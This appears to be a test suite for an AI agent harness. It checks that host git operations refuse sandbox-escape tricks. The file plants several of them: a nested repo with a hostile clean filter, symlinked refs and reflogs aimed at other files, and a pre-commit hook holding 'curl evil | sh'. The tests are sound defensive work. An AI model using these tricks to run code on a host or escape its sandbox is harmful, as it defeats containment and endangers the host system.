/**
 * Regression tests for the H2 security review (sandbox lens): nested repos, symlink symrefs and symlinked reflogs.
 * Each case plants what a sandboxed command can write in its worktree or its writable ref/log dirs, then runs the
 * host action. Throwaway repos under os.tmpdir() only (helpers.ts); no sandbox needed.
 */
import { execFileSync } from 'node:child_process';
import { existsSync, readFileSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { isTampered } from '@harness/git';
import { agentGit, makeFixture, makeThread, marker, plainEnv, type Fixture } from './helpers';

let f: Fixture;
afterEach(() => f?.cleanup());

/** A nested repo with a hostile clean filter defined in its own (agent-written) config. */
function plantNestedRepo(fx: Fixture, worktree: string, kind: string): string {
  const sub = join(worktree, 'vendor', 'lib');
  const env = plainEnv();
  execFileSync('git', ['init', '-q', sub], { env });
  writeFileSync(join(sub, 'f.txt'), 'hello\n');
  writeFileSync(join(sub, '.gitattributes'), '* filter=evil\n');
  execFileSync('git', ['add', '-A'], { cwd: sub, env });
  execFileSync('git', ['commit', '-q', '-m', 'x'], { cwd: sub, env });
  execFileSync('git', ['config', 'filter.evil.clean', `sh -c 'touch ${marker(fx, kind)}; cat'`], { cwd: sub, env });
  return sub;
}

function touchLater(path: string, seconds: number): void {
  const t = new Date(Date.now() + seconds * 1000);
  utimesSync(path, t, t);
}

describe('nested git repositories never run code on the host', () => {
  it('checkpoints shield gitlinks (no `git status` inside the nested repo)', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    await f.git.checkpoint(r, 0);
    const sub = plantNestedRepo(f, r.worktreePath, 'ckpt');
    await f.git.checkpoint(r, 1);
    touchLater(join(sub, 'f.txt'), 5);
    await f.git.checkpoint(r, 2);
    touchLater(join(sub, 'f.txt'), 9);
    await f.git.checkpoint(r, 3);
    expect(existsSync(marker(f, 'ckpt'))).toBe(false);
  });

  it('review diff (currentTree) and restore shield gitlinks too', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const c0 = await f.git.checkpoint(r, 0);
    const sub = plantNestedRepo(f, r.worktreePath, 'diff');
    await f.git.diff(r);
    touchLater(join(sub, 'f.txt'), 5);
    await f.git.diff(r);
    touchLater(join(sub, 'f.txt'), 9);
    await f.git.restoreCheckpoint(r, c0);
    expect(existsSync(marker(f, 'diff'))).toBe(false);
  });

  it('Review → Commit shields a gitlink the agent committed on its branch', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const sub = plantNestedRepo(f, r.worktreePath, 'commit');
    // The agent commits the nested repo as a gitlink on its own branch (inside the sandbox).
    agentGit(f, r, ['add', '-A']);
    agentGit(f, r, ['commit', '-q', '-m', 'agent']);
    touchLater(join(sub, 'f.txt'), 5);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'changed\n');
    await f.git.commit(r, 'review commit');
    expect(existsSync(marker(f, 'commit'))).toBe(false);
  });
});

describe('thread ref files must be plain files before host ref updates', () => {
  it('a symlink symref to main is refused on delete-branch; main survives', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const mainBefore = f.sh(['rev-parse', 'refs/heads/main']).trim();
    const branchRef = join(r.commonDir, 'refs', 'heads', r.branch!);
    rmSync(branchRef, { force: true });
    symlinkSync('refs/heads/main', branchRef);
    const err = await f.git.removeWorktree(r, { deleteBranch: true }).then(
      () => null,
      (e: unknown) => e,
    );
    expect(isTampered(err)).toBe(true);
    expect(f.sh(['rev-parse', '--verify', '-q', 'refs/heads/main']).trim()).toBe(mainBefore);
  });

  it('reflog symlinks are refused before Review → Commit writes anything', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const victim = join(f.dir, 'victim-gitconfig');
    writeFileSync(victim, '[user]\n\tname = victim\n');
    const created = join(f.dir, 'new-file-created-by-host');
    const branchLog = join(r.commonDir, 'logs', 'refs', 'heads', r.branch!);
    const headLog = join(r.gitDir, 'logs', 'HEAD');
    rmSync(branchLog, { force: true });
    symlinkSync(victim, branchLog);
    rmSync(headLog, { force: true });
    symlinkSync(created, headLog);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'changed by agent\n');
    const err = await f.git.commit(r, 'review commit').then(
      () => null,
      (e: unknown) => e,
    );
    expect(isTampered(err)).toBe(true);
    expect(readFileSync(victim, 'utf8')).toBe('[user]\n\tname = victim\n');
    expect(existsSync(created)).toBe(false);
  });

  it('only HEAD log symlinked: refused as well', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const created = join(f.dir, 'head-log-target');
    const headLog = join(r.gitDir, 'logs', 'HEAD');
    rmSync(headLog, { force: true });
    symlinkSync(created, headLog);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'x\n');
    await expect(f.git.commit(r, 'm')).rejects.toSatisfy(isTampered);
    expect(existsSync(created)).toBe(false);
  });

  it('a clean thread still commits and deletes its branch normally', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'ok\n');
    const { sha } = await f.git.commit(r, 'fine');
    expect(f.sh(['rev-parse', `refs/heads/${r.branch}`]).trim()).toBe(sha);
    await f.git.removeWorktree(r, { deleteBranch: true });
    expect(() => f.sh(['rev-parse', '--verify', '-q', `refs/heads/${r.branch}`])).toThrow();
    expect(f.sh(['rev-parse', '--verify', '-q', 'refs/heads/main']).trim()).toMatch(/^[0-9a-f]{40}$/);
  });
});

describe('in-repo core.hooksPath is execution-sensitive (review H2)', () => {
  it('the review diff flags changes under the hooks dir; listSensitivePaths and hooksPath name it', async () => {
    f = makeFixture({ files: { 'a.txt': 'a\n', '.githooks/pre-commit': '#!/bin/sh\nexit 0\n' } });
    f.sh(['config', 'core.hooksPath', '.githooks']);
    const r = await makeThread(f);
    expect(await f.git.hooksPath(r)).toBe('.githooks');
    expect(await f.git.listSensitivePaths(r)).toContain(join(r.worktreePath, '.githooks'));
    writeFileSync(join(r.worktreePath, '.githooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
    writeFileSync(join(r.worktreePath, 'a.txt'), 'b\n');
    const files = await f.git.diff(r);
    expect(files.find((d) => d.path === '.githooks/pre-commit')?.sensitive).toBe(true);
    expect(files.find((d) => d.path === 'a.txt')?.sensitive).toBe(false);
  });
});
